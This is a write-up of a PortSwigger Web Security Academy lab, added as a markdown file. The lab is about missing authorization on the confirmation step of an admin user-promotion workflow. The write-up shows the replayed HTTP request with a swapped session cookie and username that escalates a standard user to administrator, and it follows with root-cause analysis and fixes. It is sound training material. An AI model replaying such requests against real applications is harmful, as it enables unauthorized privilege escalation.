@@ -1,0 +1,360 @@
+# Missing Authorization on Administrative Action (Multi-Step Process)
+
+**Lab:** Multi-step process with no access control on one step  
+**Category:** Broken Access Control  
+**Difficulty:** Apprentice  
+**Platform:** PortSwigger Web Security Academy
+
+---
+
+# Executive Summary
+
+The application implements a multi-step workflow for promoting users to administrators. While access to the administration panel is correctly restricted to administrators, the final endpoint responsible for executing the privilege escalation fails to perform its own authorization checks.
+
+An attacker can capture the confirmation request, replace the administrator's session with a low-privileged user's session, modify the target username, and successfully promote their own account.
+
+---
+
+# Vulnerability Classification
+
+| Attribute | Value |
+|-----------|-------|
+| Vulnerability | Missing Authorization on Administrative Action |
+| CWE | CWE-862 – Missing Authorization |
+| CWE | CWE-285 – Improper Authorization |
+| OWASP Top 10 | A01:2021 – Broken Access Control |
+| Severity | High |
+| CVSS v3.1 | 8.8 (High) |
+
+---
+
+# Target
+
+**Application:** PortSwigger Web Security Academy Lab
+
+**Affected Functionality**
+
+```
+User Role Management
+```
+
+---
+
+# Objective
+
+Bypass the administrative workflow and promote a standard user account to administrator.
+
+---
+
+# Methodology
+
+1. Authenticate as the administrator.
+2. Open the administration panel.
+3. Trigger the user promotion workflow.
+4. Capture the confirmation request.
+5. Send the request to Burp Repeater.
+6. Authenticate as a standard user.
+7. Replace the administrator session cookie.
+8. Change the target username.
+9. Replay the confirmation request.
+
+---
+
+# Initial Enumeration
+
+After authenticating as the administrator, the application exposed an administrative interface containing the option to promote users.
+
+Selecting **Upgrade user** generated a confirmation request responsible for executing the privileged action.
+
+Example:
+
+```http
+POST /admin-roles HTTP/2
+Host: LAB-ID.web-security-academy.net
+Cookie: session=<ADMIN_SESSION>
+
+username=carlos
+action=upgrade
+csrf=...
+```
+
+The request was intercepted and sent to Burp Repeater.
+
+---
+
+# Exploitation
+
+A second browser session was opened using a standard user account.
+
+The administrator session cookie was replaced with the standard user's session.
+
+Original:
+
+```http
+Cookie: session=<ADMIN_SESSION>
+```
+
+Modified:
+
+```http
+Cookie: session=<USER_SESSION>
+```
+
+The request parameter:
+
+```text
+username=carlos
+```
+
+was modified to:
+
+```text
+username=wiener
+```
+
+The request was replayed without any additional modifications.
+
+The application executed the administrative action successfully despite the authenticated user lacking administrator privileges.
+
+The laboratory was solved.
+
+---
+
+# Technical Analysis
+
+The application implements a two-step administrative workflow:
+
+```text
+Administrator Panel
+        │
+        ▼
+User clicks "Upgrade"
+        │
+        ▼
+Confirmation Request
+        │
+        ▼
+Privilege Escalation
+```
+
+The first step correctly verifies administrator privileges.
+
+The second step executes the requested operation without repeating the authorization check.
+
+Conceptually, the implementation behaves similarly to:
+
+```php
+// Step 1
+if (!isAdmin()) {
+    exit("Unauthorized");
+}
+
+// Display confirmation page
+```
+
+However, the confirmation endpoint resembles:
+
+```php
+upgradeUser($_POST['username']);
+```
+
+instead of:
+
+```php
+if (!isAdmin()) {
+    exit("Unauthorized");
+}
+
+upgradeUser($_POST['username']);
+```
+
+The absence of server-side authorization allows any authenticated user to invoke the privileged action directly.
+
+---
+
+# Root Cause
+
+Authorization is enforced only when accessing the administration interface.
+
+The endpoint responsible for performing the privileged operation assumes that every incoming request originated from the protected interface and therefore omits authorization checks.
+
+This trust assumption allows attackers to replay captured requests using lower-privileged accounts.
+
+---
+
+# Impact
+
+An attacker can:
+
+- Escalate privileges.
+- Promote arbitrary users.
+- Obtain administrator access.
+- Execute privileged administrative actions.
+- Completely compromise the application.
+
+---
+
+# HTTP Evidence
+
+## Administrative Confirmation Request
+
+```http
+POST /admin-roles HTTP/2
+Host: LAB-ID.web-security-academy.net
+Cookie: session=<ADMIN_SESSION>
+
+username=carlos
+action=upgrade
+```
+
+---
+
+## Replayed Request
+
+```http
+POST /admin-roles HTTP/2
+Host: LAB-ID.web-security-academy.net
+Cookie: session=<USER_SESSION>
+
+username=wiener
+action=upgrade
+```
+
+The request succeeded despite being executed by a standard user.
+
+---
+
+# Attack Flow
+
+```text
+Administrator
+        │
+        ▼
+Accesses admin panel
+        │
+        ▼
+Captures confirmation request
+        │
+        ▼
+Attacker replaces session cookie
+        │
+        ▼
+Changes username parameter
+        │
+        ▼
+Replays request
+        │
+        ▼
+Server performs action
+        │
+        ▼
+Privilege escalation
+```
+
+---
+
+# Root Cause Diagram
+
+```text
+Protected Interface
+        │
+        ▼
+Authorization Check
+        │
+        ▼
+Confirmation Endpoint
+        │
+        ▼
+❌ No Authorization
+        │
+        ▼
+Administrative Action Executed
+```
+
+---
+
+# Security Recommendations
+
+## Validate Authorization on Every Request
+
+Every endpoint that performs privileged actions must independently verify the authenticated user's permissions.
+
+Example:
+
+```php
+if (!currentUser()->isAdmin()) {
+    http_response_code(403);
+    exit();
+}
+```
+
+---
+
+## Never Trust Client Workflow
+
+Applications must never assume that requests originate exclusively from the intended user interface.
+
+Attackers can replay or forge requests independently of the browser.
+
+---
+
+## Protect Every Administrative Endpoint
+
+Authorization should be enforced on:
+
+- Administration pages.
+- Confirmation endpoints.
+- API endpoints.
+- Background actions.
+- AJAX requests.
+
+---
+
+## Implement Centralized Authorization
+
+Authorization should be handled through middleware or centralized security components instead of individual pages.
+
+This reduces the risk of developers forgetting to protect specific endpoints.
+
+---
+
+## Perform Access Control Testing
+
+Security assessments should verify:
+
+- Multi-step workflows.
+- Confirmation endpoints.
+- Hidden administrative actions.
+- Privilege escalation.
+- Direct endpoint access.
+
+---
+
+# References
+
+- OWASP Top 10 2021 – A01: Broken Access Control
+- CWE-862 – Missing Authorization
+- CWE-285 – Improper Authorization
+- PortSwigger Web Security Academy – Access Control Vulnerabilities
+
+---
+
+# Conclusion
+
+The application was vulnerable to a **Missing Authorization** flaw affecting the confirmation step of a multi-step administrative workflow.
+
+Although access to the administration interface was correctly restricted, the endpoint responsible for executing the privileged action failed to verify the user's permissions. By replaying the confirmation request with a standard user's session, an attacker could successfully promote their own account to administrator.
+
+---
+
+## Key Takeaways
+
+- Every privileged endpoint must perform its own authorization checks.
+- Protecting only the user interface is insufficient.
+- Multi-step workflows require authorization at every stage.
+- Never assume requests originate from trusted pages.
+- Broken Access Control remains one of the most critical web application security risks.
+
+---
+
+**Lab Status:** ✅ Solved
